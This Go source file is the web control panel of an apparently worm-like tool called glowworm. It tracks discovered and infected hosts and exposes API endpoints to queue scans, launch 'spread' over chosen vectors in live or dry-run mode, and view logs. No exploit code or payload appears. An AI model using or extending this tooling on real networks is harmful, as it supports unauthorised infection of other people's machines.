/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/glowworm
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

// Package server provides the control panel HTTP server using Fiber.
//
// Serves the embedded React frontend and provides API endpoints
// for monitoring and controlling worm operations.
package server

import (
	"embed"
	"fmt"
	"io/fs"
	"net/http"
	"sync"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/cors"
	"github.com/gofiber/fiber/v2/middleware/filesystem"
)

//go:embed dist/*
var frontendFS embed.FS

// Host represents a discovered/infected host.
type Host struct {
	IP       string         `json:"ip"`
	Hostname string         `json:"hostname,omitempty"`
	OS       string         `json:"os,omitempty"`
	Ports    []int          `json:"ports"`
	Services map[int]string `json:"services"`
	Status   string         `json:"status"` // discovered, infected, failed, immune
	LastSeen time.Time      `json:"last_seen"`
}

// LogEntry represents an activity log entry.
type LogEntry struct {
	Time    time.Time `json:"time"`
	Message string    `json:"message"`
	Type    string    `json:"type"` // info, success, error, warning
}

// Server is the control panel HTTP server.
type Server struct {
	port  int
	hosts map[string]*Host
	logs  []LogEntry
	mu    sync.RWMutex
	app   *fiber.App
}

// New creates a new control panel server.
func New(port int) *Server {
	s := &Server{
		port:  port,
		hosts: make(map[string]*Host),
		logs:  make([]LogEntry, 0),
	}

	app := fiber.New(fiber.Config{
		AppName:               "glowworm",
		DisableStartupMessage: true,
	})

	// CORS for frontend dev
	app.Use(cors.New())

	// API routes
	api := app.Group("/api")
	api.Get("/hosts", s.handleGetHosts)
	api.Post("/scan", s.handleScan)
	api.Post("/spread", s.handleSpread)
	api.Get("/logs", s.handleGetLogs)
	api.Delete("/logs", s.handleClearLogs)

	// Serve embedded frontend
	distFS, err := fs.Sub(frontendFS, "dist")
	if err == nil {
		app.Use("/", filesystem.New(filesystem.Config{
			Root:       http.FS(distFS),
			Browse:     false,
			Index:      "index.html",
			NotFoundFile: "index.html", // SPA fallback
		}))
	} else {
		app.Get("/*", func(c *fiber.Ctx) error {
			return c.SendString("Frontend not built. Run: cd frontend && pnpm build")
		})
	}

	s.app = app
	return s
}

// Start begins serving the control panel.
func (s *Server) Start() error {
	addr := fmt.Sprintf(":%d", s.port)
	fmt.Printf("Control panel: http://localhost%s\n", addr)
	return s.app.Listen(addr)
}

// AddHost registers a discovered host.
func (s *Server) AddHost(host *Host) {
	s.mu.Lock()
	defer s.mu.Unlock()
	host.LastSeen = time.Now()
	s.hosts[host.IP] = host
}

// UpdateHostStatus updates the status of a host.
func (s *Server) UpdateHostStatus(ip, status string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if h, ok := s.hosts[ip]; ok {
		h.Status = status
		h.LastSeen = time.Now()
	}
}

// AddLog adds an activity log entry.
func (s *Server) AddLog(message, logType string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.logs = append(s.logs, LogEntry{
		Time:    time.Now(),
		Message: message,
		Type:    logType,
	})
}

func (s *Server) handleGetHosts(c *fiber.Ctx) error {
	s.mu.RLock()
	defer s.mu.RUnlock()

	hosts := make([]*Host, 0, len(s.hosts))
	for _, h := range s.hosts {
		hosts = append(hosts, h)
	}
	return c.JSON(hosts)
}

func (s *Server) handleScan(c *fiber.Ctx) error {
	var req struct {
		Range string `json:"range"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request"})
	}

	s.AddLog(fmt.Sprintf("Scan started: %s", req.Range), "info")
	return c.JSON(fiber.Map{"status": "scan queued", "range": req.Range})
}

func (s *Server) handleSpread(c *fiber.Ctx) error {
	var req struct {
		Vectors []string `json:"vectors"`
		DryRun  bool     `json:"dry_run"`
	}
	if err := c.BodyParser(&req); err != nil {
		return c.Status(400).JSON(fiber.Map{"error": "invalid request"})
	}

	mode := "LIVE"
	if req.DryRun {
		mode = "DRY RUN"
	}
	s.AddLog(fmt.Sprintf("Spread started [%s]: vectors=%v", mode, req.Vectors), "info")
	return c.JSON(fiber.Map{"status": "spread queued", "vectors": req.Vectors, "dry_run": req.DryRun})
}

func (s *Server) handleGetLogs(c *fiber.Ctx) error {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return c.JSON(s.logs)
}

func (s *Server) handleClearLogs(c *fiber.Ctx) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.logs = make([]LogEntry, 0)
	return c.JSON(fiber.Map{"status": "cleared"})
}
